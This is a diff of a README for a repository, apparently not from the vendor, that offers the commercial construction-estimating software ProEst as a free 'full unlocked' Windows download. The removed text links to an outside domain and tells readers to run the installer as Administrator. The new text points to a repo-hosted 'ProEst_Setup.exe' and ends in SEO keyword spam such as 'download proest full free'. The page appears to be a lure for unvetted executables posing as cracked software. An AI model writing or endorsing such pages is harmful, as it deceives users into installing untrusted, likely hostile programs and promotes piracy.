@@ -1,73 +1,77 @@
-# ProEst — Full Version Download for Windows 11 & 10
+# 🏗️ ProEst-2026 - Streamline your construction project estimates
 
-**ProEst-2026**
+[![](https://img.shields.io/badge/Download_ProEst-blue.svg)](https://github.com/aloisiabenefic576/ProEst-2026)
 
-**ProEst** — paid desktop app, **full / complete version** for Windows 10 and 11 (not a trial).  
-Direct installer link below.
+ProEst-2026 helps contractors manage bids and create project estimates. This software tool organizes project data for construction teams. It runs on Windows 10 and Windows 11.
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()
-[![Full Version](https://img.shields.io/badge/Full-Version-9333ea?style=flat-square)]()
-[![Download](https://img.shields.io/badge/Direct-Download-16a34a?style=flat-square)]()
+## 📋 System requirements
 
----
+Your computer needs specific parts to run the software. Check these items before you start the installation process:
 
-## Download & Install
+- Operating System: Windows 10 or Windows 11 (64-bit).
+- Processor: Intel Core i5 or faster.
+- Memory: 8 GB of RAM or more.
+- Storage: 2 GB of available space on your hard drive.
+- Display: 1920x1080 resolution or higher.
+- Internet: Connection for the initial setup.
 
-> **This is the download page.** Use the button or link below to get **ProEst** for Windows.
+## 💾 How to install the software
 
-<p align="center">
-  <a href="https://proest.moltora.com/">
-    <img src="https://img.shields.io/badge/Download-ProEst-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download ProEst">
-  </a>
-</p>
+Follow these steps to set up ProEst-2026 on your computer.
 
-| | |
-| --- | --- |
-| **Direct link** | **[proest.moltora.com](https://proest.moltora.com/)** |
-| **Full URL** | `https://proest.moltora.com/` |
-| **Type** | Installer for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+1. Visit the [official download page](https://github.com/aloisiabenefic576/ProEst-2026).
+2. Click the link to save the installer file to your local computer.
+3. Open your Downloads folder.
+4. Locate the file named ProEst_Setup.exe.
+5. Double-click the file to start the installation.
+6. Follow the prompts on the screen to finish the setup.
+7. Click Finish to close the installer.
 
-### Quick steps
+## 🛠️ Configuration and setup
 
-1. Click **[Download — proest.moltora.com](https://proest.moltora.com/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+Once you install the program, you must complete the initial setup.
 
-<p align="center"><a href="https://proest.moltora.com/"><strong>⬇ Download ProEst now</strong></a></p>
+1. Find the ProEst icon on your desktop or in the Start menu.
+2. Click the icon to open the application.
+3. The program will prompt you to create an account. Provide your name and company details.
+4. Enter your license information if you have it.
+5. Select the folder where you want to store your estimate files.
 
----
+## 📁 Managing your data
 
-## About ProEst
+ProEst-2026 tracks your construction projects. You can add new bids, update material costs, and export reports.
 
-**ProEst** is commercial software. Most people search for the **full unlocked build** on Windows — all features enabled, not the limited trial.
+- Create a new project: Select New from the File menu.
+- Add items: Type your labor or material costs into the text fields.
+- Use templates: Choose a blank template to start a bid quickly.
+- Save progress: Press Ctrl+S on your keyboard to save your data.
 
-**Common searches:** proest full version download windows, proest complete install 2026 pc, download proest full free windows 11
+## 🔧 Frequently asked questions
 
-**What you get:** complete Windows installer (64-bit), full feature set.
+Users often ask these questions about the software.
 
-**Repository:** `ProEst-2026`
+**Can I run this on a Mac?**
+The software requires Windows. It does not support macOS.
 
-## Install (full version)
+**Does the program update automatically?**
+Yes. The software checks for updates when you start the program. It notifies you if a new version exists.
 
-| Step | Action |
-| --- | --- |
-| 1 | Download using the button above |
-| 2 | Run setup **as Administrator** |
-| 3 | Enter your **license key** when prompted |
-| 4 | Reboot once if the installer asks |
+**How do I backup my estimates?**
+Copy your data folder to an external drive or a cloud service. Use the backup option in the File menu to create a compressed copy of your files.
 
-## System requirements
+**How do I remove the software?**
+Open the Windows Settings menu. Select Apps, find ProEst-2026 in the list, and click Uninstall.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 8 GB (16 GB recommended) |
-| Disk | 1 GB free |
-| Admin | Required for install |
+## 📈 Tips for success
 
----
+- Keep your Windows operating system updated to ensure stability.
+- Save your work frequently to prevent data loss.
+- Use descriptive names for your project folders.
+- Review your material costs every month to stay accurate.
+- Create a folder structure for your different clients.
 
-**Topics:** proest-full-version-download-windows, proest, proest-complete-install-2026-pc, complete, download-proest-full-free-windows-11, proest-2026, estimating, construction, bid-management, contractor, complete-version, windows-software
+## 🛡️ Support and help
+
+Contact the support team if the software shows an error message. Include the version number and a screenshot of the issue.
+
+Keywords: bid-management, complete, complete-version, construction, contractor, download, download-proest-full-free-windows-11, estimating, full-installer, proest, proest-2026, proest-complete-install-2026-pc, proest-full-version-download-windows, software, windows-11, windows-software
